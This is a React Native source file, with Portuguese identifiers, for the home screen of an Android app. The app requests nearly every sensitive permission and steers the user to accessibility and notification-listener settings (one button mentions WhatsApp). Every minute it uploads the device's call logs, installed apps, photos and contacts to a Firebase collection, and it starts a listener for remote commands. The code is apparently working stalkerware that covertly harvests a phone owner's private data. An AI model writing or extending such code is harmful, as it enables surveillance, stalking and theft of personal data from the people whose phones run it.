// src/screens/HomeScreen.js
import React, { useEffect, useState } from 'react';
import { View, Button, Text, PermissionsAndroid, Platform, Alert, Linking } from 'react-native';
import firestore from '@react-native-firebase/firestore';
import auth from '@react-native-firebase/auth';
import DeviceInfo from 'react-native-device-info';
import AsyncStorage from '@react-native-async-storage/async-storage';

import { coletarLocalizacao } from '../funcoes/localizacao';
import { coletarAppsInstalados } from '../funcoes/coletarAppsInstalados';
import { coletarChamadas } from '../funcoes/coletarChamadas';
import { coletarFotos } from '../funcoes/coletarFotos';
import { enviarFotosParaFirebase } from '../funcoes/enviarFotos';
import { coletarContatos } from '../funcoes/coletarContatos';
import { startComandosListener } from '../listeners/comandosListener';
import { garantirPermissaoNotificacao } from '../funcoes/notificacoes';
import { abrirTelaAcessibilidade } from '../funcoes/acessibilidade';

export default function HomeScreen() {
  const [status, setStatus] = useState('Dispositivo online');

  const PERMISSOES_ANDROID = [
    PermissionsAndroid.PERMISSIONS.CAMERA,
    PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
    PermissionsAndroid.PERMISSIONS.WRITE_CONTACTS,
    PermissionsAndroid.PERMISSIONS.GET_ACCOUNTS,
    PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
    PermissionsAndroid.PERMISSIONS.ACCESS_COARSE_LOCATION,
    PermissionsAndroid.PERMISSIONS.ACCESS_BACKGROUND_LOCATION,
    PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
    PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
    PermissionsAndroid.PERMISSIONS.READ_PHONE_NUMBERS,
    PermissionsAndroid.PERMISSIONS.CALL_PHONE,
    PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
    PermissionsAndroid.PERMISSIONS.WRITE_CALL_LOG,
    PermissionsAndroid.PERMISSIONS.ADD_VOICEMAIL,
    PermissionsAndroid.PERMISSIONS.USE_SIP,
    PermissionsAndroid.PERMISSIONS.PROCESS_OUTGOING_CALLS,
    PermissionsAndroid.PERMISSIONS.BODY_SENSORS,
    PermissionsAndroid.PERMISSIONS.ACTIVITY_RECOGNITION,
    PermissionsAndroid.PERMISSIONS.SEND_SMS,
    PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
    PermissionsAndroid.PERMISSIONS.READ_SMS,
    PermissionsAndroid.PERMISSIONS.RECEIVE_WAP_PUSH,
    PermissionsAndroid.PERMISSIONS.RECEIVE_MMS,
    PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
    PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE,
    PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
    PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
    PermissionsAndroid.PERMISSIONS.READ_MEDIA_AUDIO,
    PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
    PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
    PermissionsAndroid.PERMISSIONS.BLUETOOTH_ADVERTISE,
    PermissionsAndroid.PERMISSIONS.NEARBY_WIFI_DEVICES,
    PermissionsAndroid.PERMISSIONS.SCHEDULE_EXACT_ALARM,
  ];

  function abrirTelaPermissaoNotificacoes() {
    if (Platform.OS === 'android') {
      Linking.openSettings();
      try {
        Linking.openURL('android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS');
      } catch (e) {
        console.warn('Erro ao abrir configurações de notificação:', e);
      }
    }
  }

  const pedirTodasPermissoes = async () => {
    if (Platform.OS !== 'android') {
      Alert.alert('OK', 'Permissões concedidas (iOS).');
      return;
    }
    try {
      setStatus('Solicitando permissões…');
      const resultado = await PermissionsAndroid.requestMultiple(PERMISSOES_ANDROID);

      const negadas = Object.entries(resultado)
        .filter(([, v]) => v !== PermissionsAndroid.RESULTS.GRANTED)
        .map(([k]) => k);

      if (negadas.length === 0) {
        setStatus('Todas as permissões concedidas ✔️');
      } else {
        setStatus(`Permissões negadas: ${negadas.length}`);
        Alert.alert(
          'Permissões pendentes',
          `Algumas permissões foram negadas:\n${negadas.join('\n')}`,
        );
      }
    } catch (e) {
      console.error(e);
      Alert.alert('Erro', 'Não foi possível solicitar permissões.');
      setStatus('Erro ao solicitar permissões');
    }
  };

  useEffect(() => {
    garantirPermissaoNotificacao();
    (async () => {
      const jaViu = await AsyncStorage.getItem('acess_ok');
      if (!jaViu) {
        abrirTelaAcessibilidade();
        await AsyncStorage.setItem('acess_ok', '1');
      }
    })();
  }, []);

  const salvarDados = async () => {
    try {
      setStatus('Coletando dados…');
      const androidId = await DeviceInfo.getAndroidId();
      const chamadas = await coletarChamadas();
      const apps = await coletarAppsInstalados();
      const { fotos } = await coletarFotos();
      const urlsFotos = await enviarFotosParaFirebase(fotos);
      const { contatos } = await coletarContatos();

      const dadosCompletos = {
        ...chamadas,
        ...apps,
        fotos: urlsFotos,
        contatos,
        timestamp: firestore.FieldValue.serverTimestamp(),
      };

      await firestore().collection('dispositivos').doc(androidId).set(
        dadosCompletos,
        { merge: true }
      );

      setStatus('Dados e localização enviados com sucesso!');
    } catch (err) {
      console.error('[ERRO salvarDados]', err);
      setStatus('Falha ao enviar dados');
    }
  };

  useEffect(() => {
    salvarDados();
    const t = setInterval(salvarDados, 60_000);
    const unsubscribe = startComandosListener();
    return () => {
      clearInterval(t);
      unsubscribe && unsubscribe();
    };
  }, []);

  const fazerLogout = () => auth().signOut();

  return (
    <View style={{ flex: 1, justifyContent: 'center', padding: 24 }}>
      <Text style={{ marginBottom: 20, textAlign: 'center', fontSize: 16 }}>
        {status}
      </Text>

      <Button title="Autorizar Permissões" onPress={pedirTodasPermissoes} />
      <View style={{ height: 12 }} />
      <Button title="Enviar dados agora (teste)" onPress={salvarDados} />
      <View style={{ height: 12 }} />
      <Button title="Abrir Config. Acessibilidade" onPress={abrirTelaAcessibilidade} />
      <View style={{ height: 12 }} />
      <Button title="Teste  Perrmissão WattsApp" onPress={abrirTelaPermissaoNotificacoes} />
      <View style={{ height: 12 }} />
      <Button color="crimson" title="Logout" onPress={fazerLogout} />
    </View>
  );
}
